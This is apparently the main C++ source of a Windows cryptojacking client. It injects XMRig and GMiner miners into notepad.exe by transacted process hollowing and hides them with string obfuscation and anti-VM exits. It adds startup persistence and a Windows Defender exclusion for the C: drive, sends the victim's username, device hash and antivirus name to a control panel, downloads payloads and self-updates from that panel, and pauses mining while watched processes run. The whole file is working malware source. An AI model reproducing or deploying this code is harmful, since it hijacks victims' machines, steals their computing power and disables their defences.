#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <csignal>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../include/config_manager.h"
#include "../include/encryption.h"
#include "../include/embedded_resource.h"
#include "../include/remote_miner_loader.h"

// Include Obfusk8 for stealth API calling and indirect syscalls
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

#include "../src/inject_core.cpp"

#ifdef ENABLE_ANTIVM
#include "../include/antivm.h"
#endif

#ifdef ENABLE_PERSISTENCE
#include "../include/persistence.h"
#endif

// Global variables for signal handling
static DWORD g_cpuMinerPid = 0;
static DWORD g_gpuMinerPid = 0;
static HANDLE g_cpuMinerProcess = NULL;
static HANDLE g_gpuMinerProcess = NULL;
static bool g_lastCpuIdleStatus = false;  // Track last idle status to detect changes
static volatile bool g_shouldExit = false;  // Flag to signal exit on Ctrl+C

// Signal handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
        signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[!] Signal received, terminating miner processes..." << std::endl;
#endif
        
        // Terminate miner processes
        ProcessAPI procAPI;
        if (procAPI.IsInitialized()) {
            if (g_cpuMinerProcess != NULL) {
                procAPI.pTerminateProcess(g_cpuMinerProcess, 0);
                CloseHandle(g_cpuMinerProcess);
            }
            
            if (g_gpuMinerProcess != NULL) {
                procAPI.pTerminateProcess(g_gpuMinerProcess, 0);
                CloseHandle(g_gpuMinerProcess);
            }
        } else {
            // Fallback to direct API
            if (g_cpuMinerProcess != NULL) {
                TerminateProcess(g_cpuMinerProcess, 0);
                CloseHandle(g_cpuMinerProcess);
            }
            
            if (g_gpuMinerProcess != NULL) {
                TerminateProcess(g_gpuMinerProcess, 0);
                CloseHandle(g_gpuMinerProcess);
            }
        }
        
        // Set exit flag and terminate
        g_shouldExit = true;
        std::cout << "[*] Exiting..." << std::endl;
        exit(0);
        return TRUE;
    }
    return FALSE;
}

// Check for updates from the panel
bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& currentVersion) {
    try {
        // Extract base panel URL (without the /api/miners/submit part)
        std::string baseUrl = panelUrl;
        size_t apiPos = baseUrl.find("/api/");
        if (apiPos != std::string::npos) {
            baseUrl = baseUrl.substr(0, apiPos);
        }
        
        // Fetch current version from panel
        std::string versionUrl = baseUrl + "/api/updates/current";
        std::string response = fetchJsonFromUrl(StringToLPWSTR(versionUrl), 0);
        
        if (response.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] Failed to check for updates from: " << versionUrl << std::endl;
#endif
            return false;
        }
        
        // Parse JSON response to get version and download URL
        std::string panelVersion;
        std::string downloadUrl;
        
        // Extract "version" field
        size_t versionPos = response.find("\"version\":");
        if (versionPos != std::string::npos) {
            size_t startQuote = response.find("\"", versionPos + 10);
            size_t endQuote = response.find("\"", startQuote + 1);
            if (startQuote != std::string::npos && endQuote != std::string::npos) {
                panelVersion = response.substr(startQuote + 1, endQuote - startQuote - 1);
            }
        }
        
        // Extract "download_url" field
        size_t urlPos = response.find("\"download_url\":");
        if (urlPos != std::string::npos) {
            size_t startQuote = response.find("\"", urlPos + 15);
            size_t endQuote = response.find("\"", startQuote + 1);
            if (startQuote != std::string::npos && endQuote != std::string::npos) {
                downloadUrl = response.substr(startQuote + 1, endQuote - startQuote - 1);
            }
        }
        
        // Check if version is different
        if (panelVersion.empty() || panelVersion == currentVersion || downloadUrl.empty()) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] No update available. Current: " << currentVersion << ", Server: " << panelVersion << std::endl;
#endif
            return false;
        }
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[!] Update available! Current: " << currentVersion << ", Available: " << panelVersion << std::endl;
        std::cout << "[*] Download URL: " << downloadUrl << std::endl;
#endif
        
        // Build full download URL
        std::string fullDownloadUrl = baseUrl + downloadUrl;
        
        // Download update
        size_t updateSize = 0;
        BYTE *updateBuf = downloadBinaryFromUrl(StringToLPWSTR(fullDownloadUrl), updateSize, 0);
        
        if (updateSize == 0 || updateBuf == nullptr) {
            std::cerr << "[-] Downloaded update file is empty or download failed" << std::endl;
            return false;
        }
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Downloaded update: " << updateSize << " bytes" << std::endl;
#endif
        
        // Get current executable path
        wchar_t exePath[MAX_PATH] = {0};
        if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
            std::cerr << "[-] Failed to get current executable path" << std::endl;
            free(updateBuf);
            return false;
        }
        
        // Save update to temporary file
        wchar_t tempPath[MAX_PATH] = {0};
        wchar_t tempDir[MAX_PATH] = {0};
        
        if (!GetTempPathW(MAX_PATH, tempDir)) {
            std::cerr << "[-] Failed to get temp directory" << std::endl;
            free(updateBuf);
            return false;
        }
        
        if (!GetTempFileNameW(tempDir, L"CM", 0, tempPath)) {
            std::cerr << "[-] Failed to create temp filename" << std::endl;
            free(updateBuf);
            return false;
        }
        
        // Write update to temp file
        HANDLE tempFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (tempFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] Failed to create temp file" << std::endl;
            free(updateBuf);
            return false;
        }
        
        DWORD bytesWritten = 0;
        if (!WriteFile(tempFile, updateBuf, (DWORD)updateSize, &bytesWritten, NULL) || bytesWritten != (DWORD)updateSize) {
            std::cerr << "[-] Failed to write update to temp file" << std::endl;
            CloseHandle(tempFile);
            DeleteFileW(tempPath);
            free(updateBuf);
            return false;
        }
        CloseHandle(tempFile);
        free(updateBuf);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update written to temp file" << std::endl;
#endif
        
        // Create batch script to replace executable
        wchar_t batchPath[MAX_PATH] = {0};
        wcscpy_s(batchPath, MAX_PATH, tempPath);
        size_t len = wcslen(batchPath);
        if (len >= 4) {
            wcscpy_s(batchPath + len - 3, 4, L"bat");
        }
        
        // Convert wide char paths to strings for batch file
        char exePathStr[MAX_PATH] = {0};
        char tempPathStr[MAX_PATH] = {0};
        char batchPathStr[MAX_PATH] = {0};
        
        WideCharToMultiByte(CP_ACP, 0, exePath, -1, exePathStr, sizeof(exePathStr), NULL, NULL);
        WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathStr, sizeof(tempPathStr), NULL, NULL);
        WideCharToMultiByte(CP_ACP, 0, batchPath, -1, batchPathStr, sizeof(batchPathStr), NULL, NULL);
        
        // Create batch content
        std::string batchContent = "@echo off\n";
        batchContent += "timeout /t 1 /nobreak\n"; // Wait 1 second for process to start exiting
        batchContent += "taskkill /f /im client.exe 2>nul\n"; // Force kill old executable if still running
        batchContent += "timeout /t 1 /nobreak\n"; // Wait for kill to complete
        batchContent += "del /q \"" + std::string(exePathStr) + "\"\n"; // Delete old executable
        batchContent += "move /y \"" + std::string(tempPathStr) + "\" \"" + std::string(exePathStr) + "\"\n"; // Move new executable
        batchContent += "start \"\" \"" + std::string(exePathStr) + "\"\n"; // Start updated executable
        batchContent += "del /q \"%~f0\"\n"; // Delete this batch file
        
        // Write batch file
        HANDLE batchFile = CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (batchFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] Failed to create batch file" << std::endl;
            DeleteFileW(tempPath);
            return false;
        }
        
        bytesWritten = 0;
        if (!WriteFile(batchFile, batchContent.c_str(), (DWORD)batchContent.size(), &bytesWritten, NULL)) {
            std::cerr << "[-] Failed to write batch file" << std::endl;
            CloseHandle(batchFile);
            DeleteFileW(tempPath);
            DeleteFileW(batchPath);
            return false;
        }
        CloseHandle(batchFile);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Created update batch script" << std::endl;
#endif
        
        // Execute batch file
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        std::string cmdLine = std::string("cmd.exe /c ") + std::string(batchPathStr);
        wchar_t cmdLineWide[512] = {0};
        MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, cmdLineWide, sizeof(cmdLineWide)/sizeof(wchar_t));
        
        if (!CreateProcessW(NULL, cmdLineWide, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            std::cerr << "[-] Failed to execute update batch" << std::endl;
            DeleteFileW(tempPath);
            DeleteFileW(batchPath);
            return false;
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update batch started, exiting..." << std::endl;
#endif
        
        return true;
        
    } catch (const std::exception& e) {
        std::cerr << "[-] Exception in CheckAndApplyUpdate: " << e.what() << std::endl;
        return false;
    }
}

int main(int argc, char *argv[])
{
    // Check if another instance is already running
    if (IsAnotherInstanceRunning("Global\\CMM")) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
#endif
        return 0;
    }

    // Register signal handler to cleanup miner process on termination
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << OBFUSCATE_STRING("[-] Failed to set console control handler").c_str() << std::endl;
#endif
    }

#ifdef ENABLE_ANTIVM
    // Run anti-VM detection
    auto vmResult = AntiVM::DetectVM();
    if (vmResult.first) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
#endif
        // Exit silently in release mode to avoid detection
        return 0;
    }
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
#endif
#endif

#ifdef ENABLE_PERSISTENCE
    // Add to startup for persistence
    if (Persistence::AddToStartup()) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Successfully added to startup" << std::endl;
#endif
    } else {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to add to startup" << std::endl;
#endif
    }
#endif

    std::string panelUrlsStr = OBFUSCATE_STRING("http://127.0.0.1:8080/api/miners/submit");
    std::string configGetUrlStr = OBFUSCATE_STRING("");
    
    // Client version - update this for each release
    const std::string CLIENT_VERSION = OBFUSCATE_STRING("2.3.0");
    
    // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
    const std::string GMINER_ALGO = OBFUSCATE_STRING("--algo ");
    const std::string GMINER_SERVER = OBFUSCATE_STRING(" --server ");
    const std::string GMINER_USER = OBFUSCATE_STRING(" --user ");
    const std::string GMINER_DOT = OBFUSCATE_STRING(".");
    const std::string GMINER_FAN = OBFUSCATE_STRING(" --fan ");
    const std::string GMINER_SSL = OBFUSCATE_STRING(" --ssl");
    const std::string GMINER_TAIL = OBFUSCATE_STRING(" --templimit 95 --api 10050 -w 0");
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
    std::cout << "[DEBUG] Decrypted Config URL: " << (configGetUrlStr.empty() ? "(not set)" : configGetUrlStr) << std::endl;
#endif
    
    // Get system information (needed for both GET and POST methods)
    std::string pcUsername = GetWindowsUsername();
    std::string deviceHash = GetComputerHash();
    std::string cpuName = GetCPUName();
    std::string gpuName = GetGPUName();
    std::string antivirusName = GetAntivirusName();
    
    // Initialize config manager
    ConfigManager configManager;
    
    // Determine which config fetch method to use
    if (!configGetUrlStr.empty()) {
        // Use direct GET request to fetch config with fallback
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from URL via GET request..." << std::endl;
#endif
        if (!configManager.FetchConfigFromUrlWithFallback(configGetUrlStr)) {
            std::cerr << "[-] Failed to fetch configuration from config URL. Exiting." << std::endl;
            return 1;
        }
    } else {
        // Use traditional method: send system info and POST to panel
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] System Information:" << std::endl;
        std::cout << "    Username: " << pcUsername << std::endl;
        std::cout << "    Device Hash: " << deviceHash << std::endl;
        std::cout << "    CPU: " << cpuName << std::endl;
        std::cout << "    GPU: " << gpuName << std::endl;
        std::cout << "    Antivirus: " << antivirusName << std::endl;
#endif
        
        // Fetch configuration from panel(s) with fallback support
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from panel..." << std::endl;
#endif
        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
            std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
            return 1;
        }
    }
    
    const MinerConfig& cpuConfig = configManager.GetCPUConfig();
    const MinerConfig& gpuConfig = configManager.GetGPUConfig();
    
    // Verify we have valid configurations
    if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
        std::cerr << "[-] No valid mining configuration received. Exiting." << std::endl;
        return 1;
    }
    
    const bool is32bit = false;

    // Create mutable buffers for both miners
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";

#ifdef ENABLE_REMOTE_MINERS
    // Load XMRig miner from remote panel
    std::cout << "[*] Remote miner loading enabled - downloading from panel..." << std::endl;
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;
    
    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", xmrigBuf, xmrigPayloadSize)) {
        std::cerr << "[-] Failed to download XMRig from panel" << std::endl;
        return -1;
    }
    
    std::cout << "[+] Downloaded XMRig: " << xmrigPayloadSize << " bytes" << std::endl;

    // Load GMiner from remote panel
    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;
    
    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", gminerBuf, gminerPayloadSize)) {
        std::cerr << "[-] Failed to download GMiner from panel, GPU mining may not work" << std::endl;
        gminerBuf = nullptr;
        gminerPayloadSize = 0;
    } else {
        std::cout << "[+] Downloaded GMiner: " << gminerPayloadSize << " bytes" << std::endl;
    }
#else
    // Load embedded miners
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;
    
#ifdef ENABLE_CPU_MINER
    // Load XMRig miner from embedded resource
    try {
        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Loaded XMRig payload: " << xmrigPayloadSize << " bytes" << std::endl;
#endif
    } catch (const std::exception& e) {
        std::cerr << "[-] Failed to load XMRig from resources: " << e.what() << std::endl;
        return -1;
    }
#else
    std::cout << "[*] CPU miner not enabled in this build" << std::endl;
#endif

    // Load GMiner from embedded resource
    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;
    
#ifdef ENABLE_GPU_MINER
    try {
        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
#endif
    } catch (const std::exception& e) {
        std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
        gminerBuf = nullptr;
        gminerPayloadSize = 0;
    }
#else
    std::cout << "[*] GPU miner not enabled in this build" << std::endl;
#endif
#endif

    // Build command line arguments for CPU
    std::cout << "[*] Checking if device is idle (threshold: " << cpuConfig.wait_time_idle << " minutes)..." << std::endl;
    bool cpuIsIdle = IsDeviceIdle(cpuConfig.wait_time_idle);
    std::string cpuCommand = configManager.BuildCommandLineArgs(cpuConfig, cpuIsIdle);
    
    if (cpuCommand.empty()) {
        std::cerr << "[-] Failed to build CPU command line arguments" << std::endl;
    }
    
    // Store the initial config to detect changes
    MinerConfig lastCpuConfig = cpuConfig;
    MinerConfig lastGpuConfig = gpuConfig;
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
#endif

    // Launch miners independently
    DWORD cpuPid = 0;
    std::optional<PROCESS_INFORMATION> cpuPi;
    
    // Only launch XMRig if CPU mining is enabled
    if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
        cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
        Sleep(500);  // Give system time to stabilize after injection
        cpuPi = ProcessStorage::GetProcess(cpuPid);
        if (cpuPid != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
#endif
        } else {
            std::cerr << "[-] XMRig injection failed!" << std::endl;
            free_buffer(xmrigBuf);
            return 1;
        }
    } else {
        std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
        free_buffer(xmrigBuf);
    }

    DWORD gpuPid = 0;
    std::optional<PROCESS_INFORMATION> gpuPi;
    
    if (gminerBuf != nullptr && gminerPayloadSize > 0)
    {
        // Only launch GMiner if GPU mining is enabled
        if (gpuConfig.enabled == 1) {
            // Build gminer arguments from GPU config
            std::string gminer_args = GMINER_ALGO + gpuConfig.algo + 
                                      GMINER_SERVER + gpuConfig.mining_url + 
                                      GMINER_USER + gpuConfig.wallet + GMINER_DOT + gpuConfig.password +
                                      GMINER_FAN + std::to_string(gpuConfig.fan_speed);
            if (gpuConfig.use_ssl == 1) {
                gminer_args += GMINER_SSL;
            }
            gminer_args += GMINER_TAIL;
            
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
#endif
            
            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
            Sleep(500);  // Give system time to stabilize after injection
            gpuPi = ProcessStorage::GetProcess(gpuPid);
            
            if (gpuPid != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
#endif
            } else {
                std::cerr << "[-] GMiner injection failed!" << std::endl;
            }
        } else {
            std::cout << "[*] GPU mining disabled, skipping GMiner injection" << std::endl;
            free_buffer(gminerBuf);
        }
    } else {
        std::cerr << "[-] Failed to load gminer!" << std::endl;
    }

#ifdef ENABLE_DEFENDER_EXCLUSION
    // Add C: drive to Windows Defender exclusion if running as admin
    if (IsRunningAsAdmin()) {
        std::cout << "[*] Attempting to add C: drive to Windows Defender exclusion..." << std::endl;
        if (AddDefenderExclusion("C:\\")) {
            std::cout << "[+] Successfully added C: drive to Windows Defender exclusion" << std::endl;
        } else {
            std::cerr << "[-] Failed to add C: drive to Windows Defender exclusion" << std::endl;
        }
    } else {
        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
    }
#endif

    // Store global PIDs and handles for signal handler
    g_cpuMinerPid = cpuPid;
    g_gpuMinerPid = gpuPid;
    if (cpuPi) g_cpuMinerProcess = cpuPi->hProcess;
    if (gpuPi) g_gpuMinerProcess = gpuPi->hProcess;
    int checkInCounter = 0;
    int updateCheckCounter = 0;
    const int CHECK_IN_INTERVAL = 1; // seconds
    const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)

    // Check for updates at startup
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Checking for client updates at startup..." << std::endl;
#endif
    if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Update applied at startup, exiting..." << std::endl;
#endif
        return 0;
    }

    while (true)
    {
        // Check in with panel every 5 seconds to update hashrate
        checkInCounter++;
        if (checkInCounter >= CHECK_IN_INTERVAL)
        {
            checkInCounter = 0;
            double cpuHashrate = 0.0;
            double gpuHashrate = 0.0;
            
            // Get hashrate from appropriate miner(s)
            if (cpuPid != 0 && IsPidRunning(cpuPid)) {
                cpuHashrate = GetMinerHashrate();
            }
            if (gpuPid != 0 && IsPidRunning(gpuPid)) {
                gpuHashrate = GetGPUMinerHashrate();
            }
            
            if (cpuHashrate >= 0 || gpuHashrate >= 0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] Checking for config updates..." << std::endl;
#endif
                
                // Fetch config and check for changes (using same method as initial fetch)
                bool configFetched = false;
                if (!configGetUrlStr.empty()) {
                    // Use GET method for updates
                    configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                } else {
                    // Use POST method for updates
                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
                }
                
                if (configFetched) {
                    const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                    const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                    
                    // Check if CPU config has changed
                    bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                            newCpuConfig.wallet != lastCpuConfig.wallet ||
                                            newCpuConfig.password != lastCpuConfig.password ||
                                            newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage ||
                                            newCpuConfig.enabled != lastCpuConfig.enabled);
                    
                    // Check if GPU config has changed
                    bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                            newGpuConfig.wallet != lastGpuConfig.wallet ||
                                            newGpuConfig.password != lastGpuConfig.password ||
                                            newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
                                            newGpuConfig.enabled != lastGpuConfig.enabled);
                    
                    // Handle CPU config change
                    if (cpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
                        std::cout << "[!] CPU config changed on server" << std::endl;
#endif
                        
                        lastCpuConfig = newCpuConfig;
                        
                        // Kill CPU miner if it's running
                        if (cpuPi) {
                            ProcessAPI procAPI;
                            if (procAPI.IsInitialized()) {
                                procAPI.pTerminateProcess(cpuPi.value().hProcess, 0);
                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                            } else {
                                // Fallback to direct API
                                TerminateProcess(cpuPi.value().hProcess, 0);
                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                            }
                            cpuPid = 0;
                            cpuPi.reset();
                        }
                        
                        // Restart CPU miner if enabled
                        if (newCpuConfig.enabled == 1) {
                            bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
                            std::string newCpuCommand = configManager.BuildCommandLineArgs(newCpuConfig, newCpuIsIdle);
                            
                            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(newCpuCommand));
                            cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] CPU miner restarted with new config. New PID: " << cpuPid << std::endl;
#endif
                        } else {
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[*] CPU mining disabled in new config, keeping it stopped" << std::endl;
#endif
                        }
                    }
                    
                    // Handle GPU config change
                    if (gpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
                        std::cout << "[!] GPU config changed on server" << std::endl;
#endif
                        
                        lastGpuConfig = newGpuConfig;
                        
                        // Kill GPU miner if it's running
                        if (gpuPi) {
                            ProcessAPI procAPI;
                            if (procAPI.IsInitialized()) {
                                procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                            } else {
                                // Fallback to direct API
                                TerminateProcess(gpuPi.value().hProcess, 0);
                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                            }
                            gpuPid = 0;
                            gpuPi.reset();
                        }
                        
                        // Restart GPU miner if enabled
                        if (newGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                            std::string gminer_args = GMINER_ALGO + newGpuConfig.algo + 
                                                      GMINER_SERVER + newGpuConfig.mining_url + 
                                                      GMINER_USER + newGpuConfig.wallet + GMINER_DOT + newGpuConfig.password +
                                                      GMINER_FAN + std::to_string(newGpuConfig.fan_speed);
                            if (newGpuConfig.use_ssl == 1) {
                                gminer_args += GMINER_SSL;
                            }
                            gminer_args += GMINER_TAIL;
                            
                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                            gpuPi = ProcessStorage::GetProcess(gpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] GPU miner restarted with new config. New PID: " << gpuPid << std::endl;
#endif
                        } else {
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[*] GPU mining disabled in new config, keeping it stopped" << std::endl;
#endif
                        }
                    }
                }
            }
        }

        // Monitor CPU miner process
        if (cpuPid != 0) {
            // Check idle status continuously (not just on crash)
            bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
            
            // If idle status changed, restart the miner with updated CPU usage
            if (cpuIsIdle != g_lastCpuIdleStatus) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] CPU idle status changed from " << (g_lastCpuIdleStatus ? "IDLE" : "BUSY") << " to " << (cpuIsIdle ? "IDLE" : "BUSY") << ", restarting miner..." << std::endl;
#endif
                g_lastCpuIdleStatus = cpuIsIdle;
                
                if (cpuPi) {
                    TerminateProcess(cpuPi.value().hProcess, 0);
                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                    CloseHandle(cpuPi.value().hProcess);
                    CloseHandle(cpuPi.value().hThread);
                    cpuPi.reset();
                    cpuPid = 0;
                }
                
                // Restart with new idle status if CPU is enabled
                if (lastCpuConfig.enabled == 1 && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] CPU miner restarted with " << (cpuIsIdle ? "IDLE" : "BUSY") << " settings. New PID: " << cpuPid << std::endl;
#endif
                }
            } else if (!IsPidRunning(cpuPid)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[!] CPU miner process (PID " << cpuPid << ") is NOT running." << std::endl;
#endif
                // Restart if CPU is still enabled
                if (lastCpuConfig.enabled == 1) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
                }
            } else {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] CPU miner process (PID " << cpuPid << ") is running" << std::endl;
#endif
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(cpuPi.value().hProcess);
                } else {
                    NtResumeProcess(cpuPi.value().hProcess);
                }
            }
        }

        // Monitor GPU miner process
        if (gpuPid != 0) {
            if (!IsPidRunning(gpuPid)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[!] GPU miner process (PID " << gpuPid << ") is NOT running." << std::endl;
#endif
                // Restart if GPU is still enabled
                if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                    std::string gminer_args = GMINER_ALGO + lastGpuConfig.algo + 
                                              GMINER_SERVER + lastGpuConfig.mining_url + 
                                              GMINER_USER + lastGpuConfig.wallet + GMINER_DOT + lastGpuConfig.password +
                                              GMINER_FAN + std::to_string(lastGpuConfig.fan_speed);
                    if (lastGpuConfig.use_ssl == 1) {
                        gminer_args += GMINER_SSL;
                    }
                    gminer_args += GMINER_TAIL;
                    
                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
                    gpuPi = ProcessStorage::GetProcess(gpuPid);
                }
            } else {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] GPU miner process (PID " << gpuPid << ") is running" << std::endl;
#endif
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(gpuPi.value().hProcess);
                } else {
                    NtResumeProcess(gpuPi.value().hProcess);
                }
            }
        }

        // Check for client updates (every hour)
        updateCheckCounter++;
        if (updateCheckCounter >= UPDATE_CHECK_INTERVAL) {
            updateCheckCounter = 0;
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] Checking for client updates..." << std::endl;
#endif
            // Check and apply update if available
            if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Update applied, exiting..." << std::endl;
#endif
                // Exit gracefully so the batch script can replace the executable
                g_shouldExit = true;
                break;
            }
        }
        
        Sleep(1000);  // Check every 1 second
    }

    return 0;
}

// WinMain entry point for GUI subsystem (WIN32 flag)
